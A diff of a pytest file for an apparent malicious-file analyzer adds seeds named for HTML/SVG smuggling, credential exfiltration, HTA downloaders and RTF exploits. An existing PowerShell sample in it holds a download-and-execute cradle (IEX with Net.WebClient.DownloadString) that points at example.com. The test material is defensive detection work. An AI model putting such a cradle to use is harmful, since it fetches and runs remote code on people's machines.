@@ -20,7 +20,7 @@ import struct
 from collections.abc import Callable
 
 import pytest
-from fixtures import archives, build, lnk, mail, office
+from fixtures import archives, build, lnk, mail, office, web
 
 from unopened import pipeline
 from unopened.analyzers import Options
@@ -51,6 +51,14 @@ SEEDS: dict[str, tuple[str, Callable[[], bytes]]] = {
     "pdf_attachment": ("sample.pdf", archives.pdf_with_attachment),
     "eml": ("sample.eml", mail.phish_eml),
     "msg": ("sample.msg", mail.phish_msg),
+    "html_smuggling": ("sample.html", web.smuggling_html_exe),
+    "html_credentials": ("sample.html", web.credential_exfil_html),
+    "svg_smuggling": ("sample.svg", web.svg_smuggling),
+    "hta": ("sample.hta", web.hta_downloader),
+    "wsf": ("sample.wsf", web.wsf_job),
+    "rtf_package": ("sample.rtf", web.rtf_package),
+    "rtf_equation": ("sample.rtf", web.rtf_equation_overflow),
+    "vhd": ("sample.vhd", web.vhd_fixed),
     "script_ps": ("sample.ps1", lambda: (
         b"$u = 'https://example.com/a'\nIEX (New-Object Net.WebClient).DownloadString($u)\n"
         b"[Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAA=')\n")),
